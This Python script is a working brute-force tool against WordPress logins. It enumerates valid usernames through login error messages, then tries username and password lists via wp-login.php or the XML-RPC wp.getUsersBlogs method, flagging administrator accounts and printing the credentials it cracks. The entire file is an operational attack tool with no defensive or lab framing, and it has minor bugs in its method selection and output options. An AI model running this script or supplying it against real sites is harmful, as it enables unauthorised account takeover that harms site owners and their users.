#!/usr/bin/python3
import requests
import argparse, sys
import xml.etree.ElementTree as ET
#import logging

#FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
V_CREDS = []
HEADER = {'Content-Type': 'application/x-www-form-urlencoded'}

def xmlrpc_api(u_list, p_list, u_len, p_len):
    global V_CREDS
    uname_len = len(max(u_list, key=len))
    pname_len = len(max(p_list, key=len))
    try:
        for u_index, username in enumerate(u_list, start=1):
            username = username.replace('\n','')
            for p_index, password in enumerate(p_list, start=1):
                sys.stdout.write(f'\r\t - Username[%{len(str(u_len))}s/{u_len}]: %{uname_len}s - Password[%{len(str(p_len))}s/{p_len}] %{pname_len}s'% (u_index, username.strip(), p_index, password.strip()))
                sys.stdout.flush()             
                data = f'<methodCall> \r\n<methodName>wp.getUsersBlogs</methodName> \r\n<params> \r\n<param><value>{username}</value></param> \r\n<param><value>{password}</value></param> \r\n</params> \r\n</methodCall>'
                r = s.post(args.url+'/xmlrpc.php', headers=HEADER, data=data, verify=False)
                msg = f'{username} : {password}'.replace('\n','')
                if 'Incorrect username or password.' not in r.text:
                    tree = ET.ElementTree(ET.fromstring(r.content))
                    root = tree.getroot()
                    role = [elem.text for elem in root.iter('boolean')][0]
                    isadmin = ''
                    if int(role) == 1:
                        isadmin += ' - is Administrator'
                    print(f' <= Valide{isadmin}')
                    V_CREDS.append(msg+isadmin)
                    break
            print()
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f'[#] Brute Force via Xmlrpc  Failed : {e}')
        exit(-1)

def login_form(u_list, p_list, u_len, p_len):
    global V_CREDS
    uname_len = len(max(u_list, key=len))
    pname_len = len(max(p_list, key=len)) 
    p_len = len(p_list)
    u_len = len(u_list)      
    try:
        for u_index, username in enumerate(u_list, start=1):
            username = username.replace('\n','')
            for p_index, password in enumerate(p_list, start=1):
                sys.stdout.write(f'\r\t - Username[%{len(str(u_len))}s/{u_len}]: %{uname_len}s - Password[%{len(str(p_len))}s/{p_len}] %{pname_len}s'% (u_index, username.strip(), p_index, password.strip()))
                sys.stdout.flush()   
                data = {
                    'log':username,
                    'pwd':password,
                    'wp-submit':'Login In'
                }
                r = s.post(args.url+'/wp-login.php', headers=HEADER, data=data, verify=False)
                msg = f'{username} : {password}'.replace('\n','')
                if 'dashboard' in r.text:
                    isadmin = ''
                    if 'plugins.php' in r.text:
                        isadmin = ' - is Administrator'
                    print(f' <= Valide{isadmin}')
                    V_CREDS.append(msg+isadmin)
                    break
            print()
    except KeyboardInterrupt:
        return
    except Exception as e:
        print(f'Brute Force via Login Page Failed : {e}')
        exit(-1)
    
def validated_user(u_list):
    tmp = []
    for user in u_list:
        data = {
            'log':user,
            'pwd':'p@assword',
            'wp-submit':'Login In'
        }
        try:
            r = s.post(args.url+'/wp-login.php', headers=HEADER, data=data, verify=False)
            if 'The password you entered for the username' in r.text:
                tmp.append(user.replace('\n',''))
            else:
                #logging.info(f"User: {g_user}  is not valide")
                pass
        except Exception as e:
            print(f'User validation Failed : {e}')
            exit(-1)
    if not tmp:
        print("[!] No valid usernames could be found, two reasons why:")
        print("\t1. All usernames that you have specified are not valid")
        print("\t2. This WordPress have no Username Enumeration Vulnerability")
        exit()
    return tmp
    
def main(u_list, p_list):
    print("\n| Start Brute Force Script")
    if args.validated:
        print('[#] Use validation: Loging Error')
        u_list = validated_user(u_list)
    p_len = len(p_list)
    u_len = len(u_list)
    print(f'[?] Load {u_len} Usernames and {p_len} Passwords')
    if ('x' or 'xmlrpc') in args.methode:
        print('[#] Use Methode: xmlrpc.php\n')
        r = s.post(args.url+'/xmlrpc.php', headers=HEADER, verify=False)
        if r.status_code != 200:
            print('XML-RPC services are disabled on this site')
            exit(-1)
        xmlrpc_api(u_list, p_list, u_len, p_len)
    else:
        print('[#] Use Methode: Loging Form')
        r = s.post(args.url+'/wp-login.php', headers=HEADER, verify=False)
        if r.status_code != 200:
            print('Login Page incorrect')   
            exit(-1)
        login_form(u_list, p_list, u_len, p_len)
    if len(V_CREDS):
        print('\n| Findings:')
        for creds in V_CREDS:
            print(f'\t- {creds}')
    else:
        print('\n| No Valide Credentials found')
    print('\n| End')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description = 'Brute Force Script, find valide login credentials from username or password (-list)')
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_password = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('--url', required=True, type=str, help='Target WordPress Url')
    group_user.add_argument('-u', '--userlist', type=str, help='List with Usernames')
    group_user.add_argument('-U', '--user', nargs='+', type=str, help='Individual Usernames')
    group_password.add_argument('-p', '--passwordlist', type=str, help='List with Passwords')
    group_password.add_argument('-P', '--password', nargs='+', type=str, help='Individual Passwords')
    parser.add_argument('-m', '--methode', choices=['x','xmlrpc','l','loginForm'], type=str, default='loginpage', help='Choose x=xmlrpc or l=loginForm (loginForm=Default)')
    parser.add_argument('-o', '--output', nargs='?', default=None, const='find_creds.out')
    parser.add_argument('-v', '--validated', action='store_true', default=False, help='Validated username via Login Error')
    #parser.add_argument('-log', '--level', default=40, type=int, help='Set Logging Level')
    args = parser.parse_args()
    args.url = args.url.rstrip('/')
    #logging.basicConfig(stream=sys.stdout, encoding='utf-8', format=FORMAT, level=args.level)
    
    s = requests.session()
    u_list = args.user
    if args.userlist:
        f = open(args.userlist,"r", encoding="ISO-8859-1")
        u_list = f.readlines()
    p_list = args.password
    if args.passwordlist:
        f = open(args.passwordlist,"r", encoding="ISO-8859-1")
        p_list = f.readlines()
    main(u_list, p_list)
